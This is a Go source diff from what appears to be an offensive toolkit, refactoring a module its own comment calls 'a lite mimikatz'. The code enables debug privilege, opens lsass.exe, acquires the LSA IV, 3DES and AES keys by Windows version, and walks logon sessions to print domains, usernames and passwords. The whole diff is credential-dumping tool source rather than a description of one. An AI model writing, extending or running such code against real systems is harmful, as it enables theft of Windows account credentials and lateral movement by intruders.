@@ -8,43 +8,13 @@ import (
 	"sync"
 
 	"github.com/pkg/errors"
+	"golang.org/x/sys/windows"
 
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 	"project/internal/module/windows/privilege"
 	"project/internal/random"
 )
-
-// reference:
-// https://github.com/gentilkiwi/mimikatz/blob/master/modules/kull_m_patch.h
-
-// patchGeneric contains special data and offset.
-type patchGeneric struct {
-	search  *patchPattern
-	patch   *patchPattern
-	offsets *patchOffsets
-}
-
-type patchPattern struct {
-	length int
-	data   []byte
-}
-
-type patchOffsets struct {
-	off0 int
-	off1 int
-	off2 int
-	off3 int
-}
-
-// reference:
-// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/globals_sekurlsa.h
-
-type genericPrimaryCredential struct {
-	Username api.LSAUnicodeString
-	Domain   api.LSAUnicodeString
-	Password api.LSAUnicodeString
-}
 
 // Kiwi is a lite mimikatz.
 type Kiwi struct {
@@ -61,20 +31,10 @@ type Kiwi struct {
 	// PID of lsass.exe
 	pid uint32
 
-	// version about windows
-	major uint32
-	minor uint32
-	build uint32
-
-	// modules about lsass.exe
-	modules    []*basicModuleInfo
-	modulesRWM sync.RWMutex
-
 	// about decrypt
-	iv          []byte
-	hardKeyData []byte
-	key3DES     *api.BcryptKey
-	keyAES      *api.BcryptKey
+	iv      []byte
+	key3DES *api.BcryptKey
+	keyAES  *api.BcryptKey
 
 	// address about logon session
 	logonSessionListAddr      uintptr
@@ -85,6 +45,16 @@ type Kiwi struct {
 
 	// lock above fields
 	mu sync.Mutex
+
+	// version about windows
+	major uint32
+	minor uint32
+	build uint32
+	verMu sync.Mutex
+
+	// modules about lsass.exe
+	modules    []*basicModuleInfo
+	modulesRWM sync.RWMutex
 }
 
 // NewKiwi is used to create a new kiwi module.
@@ -120,10 +90,6 @@ func (kiwi *Kiwi) EnableDebugPrivilege() error {
 	return nil
 }
 
-// Credential contain information.
-type Credential struct {
-}
-
 // GetAllCredential is used to get all credentials from lsass.exe memory.
 func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	// check is running on WOW64
@@ -144,15 +110,14 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
-
-	kiwi.acquireNT6LSAKeys(pHandle)
-
-	patch := lsaSrvReferencesX64[buildWin10v1903]
-	sessions, err := kiwi.getLogonSessionList(pHandle, patch)
+	err = kiwi.acquireLSAKeys(pHandle)
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to acquire LSA keys")
+	}
+	sessions, err := kiwi.getLogonSessionList(pHandle)
 	if err != nil {
 		return nil, err
 	}
-
 	for _, session := range sessions {
 		fmt.Println("Domain:", session.Domain)
 		fmt.Println("Username:", session.Username)
@@ -166,6 +131,24 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 
 	return nil, nil
+}
+
+// acquireLSAKeys is used to get IV and generate 3DES key and AES key.
+func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.key3DES != nil {
+		return nil
+	}
+	major, _, _ := kiwi.getWindowsVersion()
+	switch major {
+	case 5:
+		return kiwi.acquireNT5LSAKeys(pHandle)
+	case 6, 10:
+		return kiwi.acquireNT6LSAKeys(pHandle)
+	default:
+		return errors.Errorf("unsupported NT major version: %d", major)
+	}
 }
 
 // Close is used to close kiwi module TODO destroy key
